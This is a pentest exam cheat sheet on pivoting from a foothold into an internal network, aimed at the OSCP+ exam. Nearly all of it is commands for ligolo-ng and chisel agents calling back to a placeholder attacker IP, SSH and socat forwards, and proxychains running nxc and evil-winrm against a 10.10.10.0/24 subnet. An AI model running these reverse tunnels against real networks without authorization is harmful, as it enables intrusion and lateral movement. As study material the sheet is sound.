# Pivoting & Tunnelling

# Pivoting & Tunnelling

OSCP+ tests reaching an internal network from a foothold. ligolo-ng (your go-to) + chisel + ssh + proxychains.

## ligolo-ng (preferred - full L3 tunnel)

```bash
# attacker: start proxy
./proxy -selfcert
# on target: run agent pointing back
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# in ligolo console: add route to internal subnet
session
ifconfig            # note agent iface
# attacker terminal (as root):
sudo ip route add 10.10.10.0/24 dev ligolo
start
# now reach 10.10.10.x directly from attacker
```

## chisel (SOCKS or reverse port-forward)

```bash
# attacker (server)
./chisel server -p 8000 --reverse
# target (client) - reverse SOCKS
./chisel client <ATTACKER_IP>:8000 R:socks
# then: proxychains nxc smb 10.10.10.0/24
```

## SSH tunnels (when you have SSH creds)

```bash
ssh -L 8080:127.0.0.1:80 user@pivot        # local forward
ssh -R 4444:127.0.0.1:4444 user@pivot      # reverse forward
ssh -D 1080 user@pivot                     # dynamic SOCKS -> proxychains
```

## socat / plink relays

```bash
socat TCP-LISTEN:2345,fork TCP:10.10.10.5:5432
plink.exe -R 4444:127.0.0.1:4444 user@ATTACKER   # windows
```

## proxychains config

```bash
# /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
proxychains -q nxc smb 10.10.10.0/24
proxychains -q evil-winrm -i 10.10.10.5 -u user -p 'Pass'
```

## Port-forward reminder from your notes

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:ip.add.re.ss:5432
```
